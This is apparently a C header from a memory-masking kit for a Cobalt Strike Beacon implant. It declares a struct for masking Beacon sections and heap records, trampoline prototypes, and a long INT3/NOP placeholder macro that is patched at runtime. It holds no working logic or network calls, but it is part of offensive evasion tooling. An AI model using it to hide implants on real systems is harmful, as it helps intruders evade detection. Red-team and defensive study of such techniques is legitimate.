#include "track_memory.h"

#define MASK_SIZE 13

typedef struct {
	char  * beacon_ptr;				/* pointer to our base Beacon section */
	DWORD * sections;				/* the actual sections we want to mask */
	HEAP_RECORD * heap_records;     /* the actual heap memory we want to mask */
	char    mask[MASK_SIZE];		/* the mask we want to apply */
} GARGLEP;

/* define our trampoline */
extern void    * gtrampoline;
extern GARGLEP * gparms;

/* thread count? */
extern int threadcount;

void gargle_setup_parms(void * begin, void * end, int mask_fn_in_beacon);
void gargle_trampoline(void * end, void * begin);

/* 4.5 trampoline placeholder body: a wall of INT3/NOP pairs that
 * setup_trampoline2's opcode walk patches with the action dispatcher at
 * runtime. Shared byte-for-byte by gargle.cpp (Sleep action) and
 * gargle_pivot_smb.cpp (pipe block/wait actions); gargle_pivot_tcp.cpp
 * keeps its own denser INT3/NOP3 layout - its patcher matches it. */
#define GARGLE_TRAMPOLINE_STUB() \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); \
